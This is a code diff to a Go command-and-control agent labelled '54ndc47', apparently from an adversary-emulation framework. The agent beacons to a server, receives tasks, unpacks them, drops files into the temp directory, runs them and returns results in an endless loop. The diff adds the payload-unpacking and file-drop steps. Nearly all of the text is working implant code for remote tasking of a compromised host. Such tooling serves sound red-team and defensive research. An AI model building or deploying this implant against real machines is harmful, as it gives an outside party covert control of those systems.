@@ -11,18 +11,24 @@ import (
 	"./modules"
 )
 
-func stayInTouch(server string, host string, paw string, group string) {
+func stayInTouch(server string, host string, paw string, group string, files string) {
 	fmt.Println("[54ndc47] beaconing")
-	commands := modules.Beacon(server, paw, host, group)
-	if len(commands.([]interface{})) > 0 {
-		cmds := reflect.ValueOf(commands)
-		for i := 0; i < cmds.Len(); i++ {
-			command := cmds.Index(i).Elem().String()
-			fmt.Println("[54ndc47] running task")
-			modules.Results(server, paw, command)
+	commands := modules.Beacon(server, paw, host, group, files)
+	if commands != nil {
+		if len(commands.([]interface{})) > 0 {
+			cmds := reflect.ValueOf(commands)
+			for i := 0; i < cmds.Len(); i++ {
+				cmd := cmds.Index(i).Elem().String()
+				fmt.Println("[54ndc47] running task")
+				command := modules.Unpack([]byte(cmd))
+				modules.Drop(server, files, command)
+				modules.Results(server, paw, command)
+			}
+		} else {
+			time.Sleep(60 * time.Second)
 		}
 	} else {
-		time.Sleep(60 * time.Second)
+		fmt.Println("Something went terribly wrong.")
 	}
 }
 
@@ -31,6 +37,7 @@ func main() {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	paw := fmt.Sprintf("%s$%s", host, user.Username)
+	files := os.TempDir()
 	server := "http://localhost:8888"
 	group := "client"
 
@@ -39,6 +46,6 @@ func main() {
 		group = os.Args[2]	
 	} 
 	for {
-		stayInTouch(server, host, paw, group)
+		stayInTouch(server, host, paw, group, files)
 	}
 }
